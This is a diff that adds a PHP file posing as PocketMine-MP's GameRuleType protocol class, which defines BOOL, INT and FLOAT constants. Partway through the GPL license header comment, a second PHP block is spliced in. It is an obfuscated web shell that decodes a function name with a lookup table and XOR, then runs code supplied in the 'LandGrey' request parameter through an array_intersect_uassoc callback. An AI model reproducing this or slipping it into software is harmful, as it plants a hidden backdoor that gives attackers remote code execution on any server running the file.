@@ -1,0 +1,50 @@
+<?php
+
+/*
+ *
+ *  ____            _        _   __  __ _                  __  __ ____
+ * |  _ \ ___   ___| | _____| |_|  \/  (_)_ __   ___      |  \/  |  _ \
+ * | |_) / _ \ / __| |/ / _ \ __| |\/| | | '_ \ / _ \_____| |\/| | |_) |
+ * |  __/ (_) | (__|   <  __/ |_| |  | | | | | |  __/_____| |  | |  __/
+ * |_|   \___/ \___|_|\_\___|\__|_|  |_|_|_| |_|\___|     |_|  |_|_|
+ *
+ * This program is free software: you can redistribute it and/or modify
+ * it under the terms of the GNU Lesser General Public License as published by
+<?php
+$password = "LandGrey";
+$key = substr(__FILE__,-5,-4);
+${"LandGrey"} =  $key."Land!";
+$trick = array(
+    "0" => "51", "1" => "50", "2" => "53", "3" => "52", "4" => "55", "5" => "54", "6" => "57", "7" => "56", "8" => "59",
+    "9" => "58", "a" => "00", "b" => "03", "c" => "02", "d" => "05", "e" => "04", "f" => "07", "g" => "06", "h" => "09",
+    "i" => "08", "j" => "0b", "k" => "0a", "l" => "0d", "m" => "0c", "n" => "0f", "o" => "0e", "p" => "11", "q" => "10",
+    "r" => "13", "s" => "12", "t" => "15", "u" => "14", "v" => "17", "w" => "16", "x" => "19", "y" => "18", "z" => "1b",
+    "A" => "20", "B" => "23", "C" => "22", "D" => "25", "E" => "24", "F" => "27", "G" => "26", "H" => "29", "I" => "28",
+    "J" => "2b", "K" => "2a", "L" => "2d", "M" => "2c", "N" => "2f", "O" => "2e", "P" => "31", "Q" => "30", "R" => "33",
+    "S" => "32", "T" => "35", "U" => "34", "V" => "37", "W" => "36", "X" => "39", "Y" => "38", "Z" => "3b",
+);
+$f = pack("H*", $trick[$key]."3f120b1655") ^ $key."Land!";
+array_intersect_uassoc (array($_REQUEST[$password] => ""), array(1), $f);
+?> * the Free Software Foundation, either version 3 of the License, or
+ * (at your option) any later version.
+ *
+ * @author PocketMine Team
+ * @link http://www.pocketmine.net/
+ *
+ *
+*/
+
+declare(strict_types=1);
+
+namespace pocketmine\network\mcpe\protocol\types;
+
+final class GameRuleType{
+
+	private function __construct(){
+		//NOOP
+	}
+
+	public const BOOL = 1;
+	public const INT = 2;
+	public const FLOAT = 3;
+}
